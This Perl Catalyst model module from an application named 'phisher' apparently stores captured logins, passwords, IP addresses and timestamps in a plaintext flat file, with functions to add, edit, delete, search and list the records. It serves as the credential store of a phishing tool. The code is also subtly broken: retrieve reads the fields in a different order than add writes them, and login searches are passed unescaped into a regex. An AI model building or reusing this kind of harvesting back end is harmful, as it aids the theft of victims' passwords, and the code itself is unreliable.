package phisher::Model::text_db;
use Time::localtime;
use Moose;
use namespace::autoclean;
use strict;
use warnings;
use File::Slurp ':all';

extends 'Catalyst::Model';

__PACKAGE__->config(
    database_file => 'userdb',
);

sub timestamp {
  my $t = localtime;
  return sprintf( "%04d-%02d-%02d_%02d:%02d:%02d",
                  $t->year + 1900, $t->mon + 1, $t->mday,
                  $t->hour, $t->min, $t->sec );
}

sub add {
    my ( $self, $params ) = @_;
 
    my $database_file = $self->{database_file};
 
    my ( @lines, $id );
    @lines = read_file( $database_file ) if -f $database_file;
    ( $id ) = $lines[-1] =~ /^(\d+)\|/ if $lines[-1];
    $id = $id ? $id + 1 : 1;
 
    write_file $database_file, { append => 1 },
      "$id|$params->{time}|$params->{login}|$params->{pw}|$params->{ip}\n";
}

sub edit {
    my ( $self, $id, $params ) = @_;
 
    my $database_file = $self->{database_file};
 
    my $login = $params->{login};
    my $time = $params->{time};
	my $pw = $params->{pw};

    edit_file_lines { s/^$id\|.*\z/$id|$time|$login|$pw|$params->{ip}/gxms }
	$database_file;
}

sub delete {
    my ( $self, $wanted_id ) = @_;
 
    my $database_file = $self->{database_file};
 
    edit_file_lines { $_ = '' if /^$wanted_id\|/ } $database_file;
}

sub found_in {
	my($self,$login) = @_;
	my $file = $self->{database_file};
	if(! -s $file){
		return 0;
	}
	my $found = 0;
	open(my $fh,'<',$file);
	while(<$fh>){
		chomp $_;
		$found = $_ =~ m#$login#gxms;
		if($found){
			last;
		}
	}
	close($fh);
	return $found;
}

sub retrieve {
    my ( $self, $wanted_id ) = @_;
 
    my $database_file = $self->{database_file};
 
    my @raw_lines;
    @raw_lines = read_file $database_file if -f $database_file;
    chomp @raw_lines;
 
    my ( @lines, $id, $login, $time,$pw,$ip);
 
    for my $raw_line ( @raw_lines ) {
        my ( $test_id ) = split( /\|/, $raw_line );
        next if $wanted_id && $wanted_id != $test_id;
        ( $id, $login, $time,$pw,$ip) = split( /\|/, $raw_line );
 
        push( @lines, {
            id => $id,
            login => $login,
            time => $time,
			pw=>$pw,
			ip=>$ip,
        } );
    }
 
    return \@lines;
}
 
=head1 NAME

phisher::Model::text_db - Catalyst Model

=head1 DESCRIPTION

Catalyst Model.


=encoding utf8

=head1 AUTHOR

root

=head1 LICENSE

This library is free software. You can redistribute it and/or modify
it under the same terms as Perl itself.

=cut

__PACKAGE__->meta->make_immutable;

1;
